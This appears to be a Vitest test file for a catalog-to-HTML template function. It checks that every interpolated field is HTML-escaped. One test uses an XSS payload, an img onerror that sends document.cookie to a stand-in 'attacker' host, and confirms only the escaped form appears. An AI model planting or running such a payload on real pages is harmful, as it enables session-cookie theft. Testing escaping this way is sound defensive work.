import { describe, expect, it } from 'vitest'
import { buildCatalogHtml } from './pdf.templates'

describe('buildCatalogHtml', () => {
  it('escapa HTML em todo campo de texto interpolado', () => {
    const payload = '<img src=x onerror="fetch(\'http://attacker/?c=\'+document.cookie)">'

    const html = buildCatalogHtml({
      tenantName: payload,
      clientName: payload,
      variants: [
        {
          skuVariant: payload,
          colorLabel: payload,
          productName: payload,
          imageUrl: payload,
        },
      ],
    })

    // O payload cru nunca deve aparecer no HTML gerado — só a versão escapada.
    expect(html).not.toContain(payload)
    expect(html).not.toContain('<img src=x onerror=')
    expect(html).toContain('&lt;img src=x onerror=&quot;fetch(&#39;http://attacker/?c=&#39;+document.cookie)&quot;&gt;')
  })

  it('mantém o HTML válido com dados normais', () => {
    const html = buildCatalogHtml({
      tenantName: 'Ótica Bardot',
      clientName: 'Cliente & Cia',
      variants: [
        { skuVariant: 'SKU-01', colorLabel: 'Preto', productName: 'Armação X', imageUrl: null },
      ],
    })

    expect(html).toContain('Ótica Bardot')
    expect(html).toContain('Cliente &amp; Cia')
    expect(html).toContain('SKU-01')
    expect(html).toContain('Sem imagem')
  })
})
